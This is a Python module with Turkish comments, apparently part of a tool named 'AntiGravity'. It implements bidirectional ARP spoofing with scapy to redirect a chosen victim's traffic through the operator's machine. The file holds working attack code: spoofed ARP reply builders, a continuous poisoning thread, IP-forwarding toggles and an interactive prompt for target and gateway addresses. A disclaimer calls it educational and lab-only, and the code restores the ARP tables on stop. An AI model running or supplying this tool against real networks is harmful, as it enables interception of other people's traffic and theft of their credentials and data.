"""
AntiGravity - Modül 2: Traffic Redirection (Trafik Yönlendirme)
================================================================
Eğitim amaçlı çift taraflı ARP güncellemesi (ARP Spoofing) ile belirli
bir düğümün trafiğini analiz bilgisayarına yönlendirir.

Çalışma Prensibi (Layer 2 - ARP Cache Poisoning):
  ─────────────────────────────────────────────────────────────────
  Normal Durum:
    Kurban      → ARP Cache: "Gateway = GW_MAC"
    Gateway     → ARP Cache: "Kurban  = TARGET_MAC"

  Yönlendirme Sonrası:
    Kurban      → ARP Cache: "Gateway = ATTACKER_MAC"  ← sahte
    Gateway     → ARP Cache: "Kurban  = ATTACKER_MAC"  ← sahte

  Tüm trafik artık analiz makinesinden geçer.
  IP forwarding aktifse paketler gerçek hedefe iletilir (şeffaf).
  ─────────────────────────────────────────────────────────────────

⚠️  UYARI: Bu araç YALNIZCA izole test ortamlarında,
    kendi cihazlarınız üzerinde eğitim amacıyla kullanılmalıdır.
    İzinsiz kullanım birçok ülkede suç teşkil eder.

Gereksinimler:
  - sudo / root yetkisi
  - pip install scapy
  - (Opsiyonel) IP Forwarding aktif edilmesi
"""

import time
import threading
import os
import platform
from typing import Optional

try:
    from scapy.all import (
        ARP, Ether, send, get_if_hwaddr, getmacbyip, conf
    )
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

from modules.utils import (
    cprint, Colors, separator, validate_ip, timestamp, get_local_ip
)


# ─── Sabitler ─────────────────────────────────────────────────────────────────

PACKET_INTERVAL = 1.5   # Sahte ARP paketi gönderme aralığı (saniye)
RESTORE_COUNT   = 5     # Onarma sırasında kaç kez gerçek ARP gönderileceği


# ─── Ana Sınıf ────────────────────────────────────────────────────────────────

class TrafficRedirector:
    """
    Çift taraflı ARP güncellemesi ile trafik yönlendirme motoru.

    Attributes:
        target_ip  (str): Trafiği yönlendirilecek kurban IP'si.
        gateway_ip (str): Yerel ağ geçidinin (router) IP'si.
        iface      (str): Kullanılacak ağ arayüzü.
        active     (bool): Yönlendirme aktif mi?
        packet_count (int): Gönderilen toplam sahte ARP paketi sayısı.
    """

    def __init__(self, iface: Optional[str] = None):
        """
        Args:
            iface: Ağ arayüzü. None ise Scapy varsayılanı kullanılır.
        """
        self.target_ip:   Optional[str] = None
        self.gateway_ip:  Optional[str] = None
        self.target_mac:  Optional[str] = None
        self.gateway_mac: Optional[str] = None
        self.attacker_mac: Optional[str] = None
        self.iface = iface or (conf.iface if SCAPY_AVAILABLE else "eth0")
        self.active = False
        self.packet_count = 0
        self._fwd_enabled = False   # IP forwarding'i biz mi actik?
        self._thread:    Optional[threading.Thread] = None
        self._stop_event = threading.Event()

    # ── IP Forwarding ─────────────────────────────────────────────────────────

    def enable_ip_forwarding(self) -> bool:
        """
        İşletim sisteminde IP paket iletmeyi (forwarding) etkinleştirir.
        Bu olmadan yönlendirilen paketler kurban tarafından drop edilir.

        Returns:
            bool: Başarılı ise True.

        Eğitim Notu:
            Linux  : /proc/sys/net/ipv4/ip_forward dosyasına '1' yaz
            macOS  : sysctl -w net.inet.ip.forwarding=1
            Windows: Registry veya netsh ile yapılır (bu araç Linux/macOS odaklı)
        """
        system = platform.system()
        try:
            if system == "Linux":
                with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
                    f.write("1")
                cprint("  [✓] IP Forwarding ETKİNLEŞTİRİLDİ (Linux)", Colors.GREEN)
            elif system == "Darwin":  # macOS
                os.system("sysctl -w net.inet.ip.forwarding=1 > /dev/null 2>&1")
                cprint("  [✓] IP Forwarding ETKİNLEŞTİRİLDİ (macOS)", Colors.GREEN)
            elif system == "Windows":
                cprint("  [!] Windows IP Forwarding: Ağ Bağdaştırıcısı → Özellikler → Paylaşım sekmesini kullanın.", Colors.YELLOW)
                return False
            return True
        except (PermissionError, OSError) as e:
            cprint(f"  [!] IP Forwarding etkinleştirilemedi: {e}", Colors.YELLOW)
            return False

    def disable_ip_forwarding(self) -> bool:
        """IP iletmeyi devre dışı bırakır (temizlik aşaması için)."""
        system = platform.system()
        try:
            if system == "Linux":
                with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
                    f.write("0")
            elif system == "Darwin":
                os.system("sysctl -w net.inet.ip.forwarding=0 > /dev/null 2>&1")
            cprint("  [✓] IP Forwarding DEVRE DIŞI bırakıldı.", Colors.GRAY)
            return True
        except (PermissionError, OSError):
            return False

    # ── MAC Çözümleme ─────────────────────────────────────────────────────────

    def _get_mac(self, ip: str) -> Optional[str]:
        """
        ARP isteği ile verilen IP'nin MAC adresini çözümler.

        Args:
            ip: MAC adresi istenilen IP.

        Returns:
            str: MAC adresi veya None (ulaşılamıyorsa).

        Eğitim Notu:
            getmacbyip() içeride tek bir ARP who-has isteği gönderir.
            Yanıt gelmezse None döner → hedef aktif değil demektir.
        """
        try:
            mac = getmacbyip(ip)
            if mac is None:
                cprint(f"  [!] {ip} için MAC adresi alınamadı — host aktif mi?", Colors.YELLOW)
            return mac
        except Exception as e:
            cprint(f"  [!] MAC çözümleme hatası ({ip}): {e}", Colors.YELLOW)
            return None

    # ── ARP Paket Fabrikaları ─────────────────────────────────────────────────

    def _make_poison_packet(self, target_ip: str, target_mac: str, spoof_ip: str) -> object:
        """
        Hedef cihazın ARP cache'ini zehirlemek için sahte ARP yanıt paketi üretir.

        Args:
            target_ip:  Paketi alacak cihazın IP'si (gerçek hedef).
            target_mac: Paketi alacak cihazın MAC adresi.
            spoof_ip:   ARP yanıtında kaynak olarak gösterilecek SAHTE IP.
                        (Gerçekte bu IP başka cihaza aittir.)

        Returns:
            ARP paketi nesnesi.

        Nasıl Çalışır:
            ARP op=2 (is-at/yanıt) paketi oluşturulur.
            hwsrc = Analiz makinesi MAC'i (gerçek gönderen)
            psrc  = Sahte kaynak IP (hedefin gateway'i ya da kurban)
            pdst  = Gerçek hedef IP
            hwdst = Gerçek hedef MAC
            ↑ Bu yapı, hedef cihazı "spoof_ip = benim MAC'im" diye kandırır.
        """
        return ARP(
            op=2,
            pdst=target_ip,               # Kime gönderilecek (IP seviyesi)
            hwdst=target_mac,             # Kime gönderilecek (MAC seviyesi)
            psrc=spoof_ip,                # Sahte kaynak IP
            # hwsrc default = makinenin gerçek MAC'i (attacker_mac)
        )

    def _make_restore_packet(
        self,
        target_ip: str, target_mac: str,
        source_ip: str, source_mac: str
    ) -> object:
        """
        Orijinal ARP cache'i onarmak için gerçek ARP yanıtı üretir.
        Ether() wrapper ile Ethernet hedefi MAC adresi de eklenir.
        """
        return (
            Ether(dst=target_mac, src=source_mac) /
            ARP(
                op=2,
                pdst=target_ip,
                hwdst=target_mac,
                psrc=source_ip,
                hwsrc=source_mac    # Orijinal (gerçek) MAC adresi
            )
        )

    # ── Sürekli Yayın Thread'i ────────────────────────────────────────────────

    def _poison_loop(self):
        """
        Arka planda çalışan ARP zehirleme döngüsü.

        ARP cache'ler periyodik olarak temizlendiğinden (veya hedefler
        ARP announce yayınladığından), sahte paketlerin sürekli gönderilmesi
        gerekir. Bu döngü durdurulana kadar PACKET_INTERVAL aralıklarla
        çift taraflı ARP paketi gönderir.

        Eğitim Notu:
            Çift taraflı = Hem kurban'a hem gateway'e sahte paket.
            Tek taraflı gönderilirse trafik yalnızca bir yönde kesilir.
        """
        cprint(f"\n  [*] ARP zehirleme döngüsü başladı. (Her {PACKET_INTERVAL}s)", Colors.GRAY)

        while not self._stop_event.is_set():
            try:
                # 1) Kurbana: "Gateway benim" yalan ARP yanıtı
                pkt_to_target = self._make_poison_packet(
                    self.target_ip, self.target_mac, self.gateway_ip
                )

                # 2) Gateway'e: "Kurban benim" yalan ARP yanıtı
                pkt_to_gateway = self._make_poison_packet(
                    self.gateway_ip, self.gateway_mac, self.target_ip
                )

                # verbose=False → terminal çıktısını bastır
                # L3 send() kullanılır; iface parametresi L3'te etkisiz
                send(pkt_to_target,  verbose=False)
                send(pkt_to_gateway, verbose=False)

                self.packet_count += 2

            except OSError as e:
                cprint(f"\n  [!] Paket gönderme hatası: {e}", Colors.RED)
                break
            except Exception as e:
                cprint(f"\n  [!] Beklenmeyen hata: {e}", Colors.RED)
                break

            # Durdurma sinyali veya aralık bekleme
            self._stop_event.wait(PACKET_INTERVAL)

    # ── Geri Yükleme ──────────────────────────────────────────────────────────

    def _restore_arp_tables(self):
        """
        Yönlendirme durdurulduğunda orijinal ARP cache tablolarını onarır.

        Eğitim Notu:
            Onarma yapılmazsa kurban ve gateway, oturumu sonlandırıncaya
            veya kendi ARP announce'larını yapıncaya kadar yanlış cache
            tutmaya devam eder → internet bağlantısı kesilir.
        """
        cprint(f"\n  [*] ARP tabloları onarılıyor...", Colors.YELLOW)

        for _ in range(RESTORE_COUNT):
            try:
                from scapy.all import sendp as _sendp
                # Ether() wrapper ile L2 seviyesinde gönder → MAC warning'i ortadan kalkar
                _sendp(
                    self._make_restore_packet(
                        self.target_ip,  self.target_mac,
                        self.gateway_ip, self.gateway_mac
                    ),
                    iface=self.iface, verbose=False
                )
                _sendp(
                    self._make_restore_packet(
                        self.gateway_ip, self.gateway_mac,
                        self.target_ip,  self.target_mac
                    ),
                    iface=self.iface, verbose=False
                )
            except Exception as e:
                cprint(f"  [!] Geri yükleme hatası: {e}", Colors.YELLOW)

        cprint("  [✓] ARP tabloları orijinal hâline döndürüldü.", Colors.GREEN)

    # ── Başlat / Durdur ───────────────────────────────────────────────────────

    def start(
        self,
        target_ip: str,
        gateway_ip: str,
        enable_forwarding: bool = True
    ) -> bool:
        """
        Trafik yönlendirmeyi başlatır.

        Args:
            target_ip:        Trafiği yönlendirilecek kurban IP'si.
            gateway_ip:       Yerel ağ geçidinin IP'si.
            enable_forwarding: IP iletimi etkinleştirilsin mi?

        Returns:
            bool: Başarılı ise True.

        Raises:
            ImportError:    Scapy yüklü değil.
            PermissionError: Root yetkisi yok.
            ValueError:     Geçersiz IP adresi.
            RuntimeError:   MAC adresi alınamadı.
        """
        if not SCAPY_AVAILABLE:
            raise ImportError("Scapy yüklü değil. → pip install scapy")

        if self.active:
            cprint("  [!] Yönlendirme zaten aktif!", Colors.YELLOW)
            return False

        # IP doğrulama
        if not validate_ip(target_ip):
            raise ValueError(f"Geçersiz hedef IP: {target_ip}")
        if not validate_ip(gateway_ip):
            raise ValueError(f"Geçersiz gateway IP: {gateway_ip}")

        self.target_ip  = target_ip
        self.gateway_ip = gateway_ip

        cprint(f"\n  [+] Trafik Yönlendirme başlatılıyor...", Colors.GREEN, bold=True)
        cprint(f"  [*] Hedef   : {target_ip}", Colors.WHITE)
        cprint(f"  [*] Gateway : {gateway_ip}", Colors.WHITE)
        cprint(f"  [*] Arayüz  : {self.iface}", Colors.WHITE)
        separator()

        # MAC adreslerini çöz
        cprint("  [*] MAC adresleri çözümleniyor...", Colors.CYAN)
        self.target_mac  = self._get_mac(target_ip)
        self.gateway_mac = self._get_mac(gateway_ip)

        if not self.target_mac:
            raise RuntimeError(f"Hedef MAC alınamadı ({target_ip}). Host aktif mi?")
        if not self.gateway_mac:
            raise RuntimeError(f"Gateway MAC alınamadı ({gateway_ip}). Gateway erişilebilir mi?")

        try:
            self.attacker_mac = get_if_hwaddr(self.iface)
        except Exception:
            self.attacker_mac = "Bilinmiyor"

        cprint(f"  [✓] Hedef MAC   : {self.target_mac}", Colors.GREEN)
        cprint(f"  [✓] Gateway MAC : {self.gateway_mac}", Colors.GREEN)
        cprint(f"  [✓] Analiz MAC  : {self.attacker_mac}", Colors.GREEN)

        # IP Forwarding
        if enable_forwarding:
            self.enable_ip_forwarding()
            self._fwd_enabled = True
        else:
            self._fwd_enabled = False

        # Zehirleme thread'ini başlat
        self._stop_event.clear()
        self.packet_count = 0
        self._thread = threading.Thread(
            target=self._poison_loop,
            name="ARP-Poison-Thread",
            daemon=True
        )
        self._thread.start()
        self.active = True

        cprint(f"\n  [✓] Trafik yönlendirme AKTİF.", Colors.GREEN, bold=True)
        cprint(f"  [!] Durdurmak için ana menüden 'Durdur' seçeneğini seçin.", Colors.YELLOW)
        return True

    def stop(self, restore: bool = True) -> int:
        """
        Trafik yönlendirmeyi durdurur ve (isteğe bağlı) ARP tablolarını onarır.

        Args:
            restore: ARP tabloları orijinal hâline döndürülsün mü?

        Returns:
            int: O ana kadar gönderilmiş toplam sahte ARP paketi sayısı.
        """
        if not self.active:
            cprint("  [!] Aktif bir yönlendirme bulunamadı.", Colors.YELLOW)
            return 0

        cprint(f"\n  [*] Yönlendirme durduruluyor...", Colors.YELLOW)

        self._stop_event.set()
        if self._thread and self._thread.is_alive():
            self._thread.join(timeout=5)

        if restore:
            self._restore_arp_tables()
            # Yalnızca biz etkinleştirdiysek devre dışı bırak
            if self._fwd_enabled:
                self.disable_ip_forwarding()

        total = self.packet_count
        self.active = False
        self.packet_count = 0

        cprint(f"  [✓] Yönlendirme durduruldu. Toplam {total} sahte ARP paketi gönderildi.", Colors.GREEN)
        return total

    # ── Durum Görüntüleme ─────────────────────────────────────────────────────

    def status(self):
        """Mevcut yönlendirme durumunu ekrana yazdırır."""
        separator()
        if self.active:
            cprint("  [●] DURUM: AKTİF", Colors.GREEN, bold=True)
            cprint(f"  Hedef   : {self.target_ip}  ({self.target_mac})", Colors.WHITE)
            cprint(f"  Gateway : {self.gateway_ip}  ({self.gateway_mac})", Colors.WHITE)
            cprint(f"  Gönderilen Sahte ARP: {self.packet_count}", Colors.CYAN)
        else:
            cprint("  [○] DURUM: DEVRE DIŞI", Colors.GRAY, bold=True)
        separator()

    # ── İnteraktif Menü ──────────────────────────────────────────────────────

    def interactive_redirect(self, known_hosts: dict = None):
        """
        Kullanıcıdan hedef/gateway bilgilerini alarak yönlendirme başlatır.

        Args:
            known_hosts: Önceki Node Discovery sonuçları (opsiyonel kolaylık).
        """
        cprint("\n  ┌─ TRAFFIC REDIRECTION MODÜLÜ ──────────────────────────┐", Colors.MAGENTA, bold=True)
        cprint("  │  Çift taraflı ARP güncellemesi ile trafik analizi     │", Colors.MAGENTA)
        cprint("  └────────────────────────────────────────────────────────┘\n", Colors.MAGENTA)

        # Bilinen hostları göster
        if known_hosts:
            cprint("  Keşfedilen hostlar:", Colors.CYAN)
            for ip, entry in known_hosts.items():
                cprint(f"    {ip}  →  {entry.mac}", Colors.WHITE)
            separator()

        cprint("  Hedef IP adresi: ", Colors.WHITE, end="")
        target_ip = input().strip()

        cprint("  Gateway IP adresi: ", Colors.WHITE, end="")
        gateway_ip = input().strip()

        cprint("  IP Forwarding etkinleştirilsin mi? (Y/n): ", Colors.WHITE, end="")
        fwd = input().strip().lower() not in ("n", "no", "hayır")

        try:
            self.start(target_ip, gateway_ip, enable_forwarding=fwd)
        except (ImportError, PermissionError, ValueError, RuntimeError, OSError) as e:
            cprint(f"\n  [✗] HATA: {e}", Colors.RED, bold=True)
